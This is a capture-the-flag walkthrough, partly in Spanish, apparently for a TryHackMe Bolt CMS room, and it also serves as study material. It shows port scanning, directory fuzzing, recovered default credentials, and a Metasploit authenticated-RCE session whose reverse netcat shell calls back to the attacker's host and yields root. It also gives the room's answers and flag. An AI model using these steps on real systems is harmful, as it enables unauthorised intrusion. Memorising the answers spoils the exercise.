
#### What port number has a web server with a CMS running?

8000

```
# Nmap 7.94SVN scan initiated Sat Oct  5 17:53:54 2024 as: /usr/lib/nmap/nmap --privileged -sV -p- --min-rate 5000 -v -oN nmap 10.10.37.83
Nmap scan report for 10.10.37.83
Host is up (0.18s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8000/tcp open  http    (PHP 7.2.32-1)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=10/5%Time=6701C39D%P=aarch64-unknown-linux
SF:-gnu%r(GetRequest,29E1,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2005\x
SF:20Oct\x202024\x2022:54:21\x20GMT\r\nConnection:\x20close\r\nX-Powered-B
SF:y:\x20PHP/7\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Contr
SF:ol:\x20public,\x20s-maxage=600\r\nDate:\x20Sat,\x2005\x20Oct\x202024\x2
SF:022:54:21\x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-D
SF:ebug-Token:\x200809cd\r\n\r\n<!doctype\x20html>\n<html\x20lang=\"en-GB\
SF:">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20ch
SF:arset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\"viewp
SF:ort\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Bolt\x
SF:20\|\x20A\x20hero\x20is\x20unleashed</title>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<link\x20href=\"https://fonts\.googleapis\.com/css\?family=Bitte
SF:r\|Roboto:400,400i,700\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/bu
SF:lma\.css\?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\
SF:"stylesheet\"\x20href=\"/theme/base-2018/css/theme\.css\?6cb66bfe9f\">\
SF:n\x20\x20\x20\x20\t<meta\x20name=\"generator\"\x20content=\"Bolt\">\n\x
SF:20\x20\x20\x20\t<link\x20rel=\"canonical\"\x20href=\"http://0\.0\.0\.0:
SF:8000/\">\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body\x20class=\"fro
SF:nt\">\n\x20\x20\x20\x20\x20\x20\x20\x20<a\x20")%r(FourOhFourRequest,152
SF:7,"HTTP/1\.0\x20404\x20Not\x20Found\r\nDate:\x20Sat,\x2005\x20Oct\x2020
SF:24\x2022:54:22\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7
SF:\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20priv
SF:ate,\x20must-revalidate\r\nDate:\x20Sat,\x2005\x20Oct\x202024\x2022:54:
SF:22\x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x2
SF:0no-cache\r\nexpires:\x20-1\r\nX-Debug-Token:\x20276a66\r\n\r\n<!doctyp
SF:e\x20html>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x
SF:20initial-scale=1\.0\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20<title>Bolt\x20\|\x20A\x20hero\x20is\x20unleashed</ti
SF:tle>\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20href=\"https://fonts\.go
SF:ogleapis\.com/css\?family=Bitter\|Roboto:400,400i,700\"\x20rel=\"styles
SF:heet\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x2
SF:0href=\"/theme/base-2018/css/bulma\.css\?8ca0842ebb\">\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018
SF:/css/theme\.css\?6cb66bfe9f\">\n\x20\x20\x20\x20\t<meta\x20name=\"gener
SF:ator\"\x20content=\"Bolt\">\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<
SF:body>\n\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"#main-content\"\x20
SF:class=\"vis");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct  5 17:54:35 2024 -- 1 IP address (1 host up) scanned in 41.07 seconds

```

#### What is the username we can find in the CMS?
Este en el codigo fuente de la pagina

bolt

#### What is the password we can find for the username?

boltadmin123



```
ffuf -u http://10.10.37.83:8000/bolt/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 -ic 

/login
```

#### What version of the CMS is installed on the server? (Ex: Name 1.1.1)

- entrar con las credenciales y en la esquina inferior izquierda

3.7.1



#### There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?

https://www.exploit-db.com/exploits/48296

48296

#### Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)

Note: If you can't find the exploit module its most likely because your metasploit isn't updated. Run `**apt update**` then `**apt install metasploit-framework**`



exploit/unix/webapp/bolt_authenticated_rce


#### Look for flag.txt inside the machine.


```
msfconsole -q
msf6 > search bolt

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       great      Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
   1    \_ target: Linux (x86)                    .                .          .      .
   2    \_ target: Linux (x64)                    .                .          .      .
   3    \_ target: Linux (cmd)                    .                .          .      .
   4  exploit/multi/http/bolt_file_upload         2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability


Interact with a module by name or index. For example info 4, use 4 or use exploit/multi/http/bolt_file_upload

msf6 > use 0
[*] Using configured payload cmd/unix/reverse_netcat
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set rhosts 10.10.249.1
rhosts => 10.10.249.1
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set lhost 10.2.4.107
lhost => 10.2.4.107
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set user
set useragent  set username   
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set username bolt
username => bolt
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set password boltadmin123
password => boltadmin123
msf6 exploit(unix/webapp/bolt_authenticated_rce) > 


[*] Started reverse TCP handler on 10.2.4.107:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "tanwj".
[*] Found 2 potential token(s) for creating .php files.
[+] Deleted file xbgoepigxq.php.
[+] Used token 5094fd3529176b0e4f440517c1 to create ktvszpcid.php.
[*] Attempting to execute the payload via "/files/ktvszpcid.php?tanwj=`payload`"
[!] No response, may have executed a blocking payload!
[*] Command shell session 1 opened (10.2.4.107:4444 -> 10.10.249.1:54682) at 2024-10-05 19:07:57 -0500
[+] Deleted file ktvszpcid.php.
[+] Reverted user profile back to original state.

id
uid=0(root) gid=0(root) groups=0(root)
ls
index.html
cd /root
ls
cd /home
ls
bolt
composer-setup.php
flag.txt
cat flag.txt
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}




```

Look for flag.txt inside the machine.


THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}



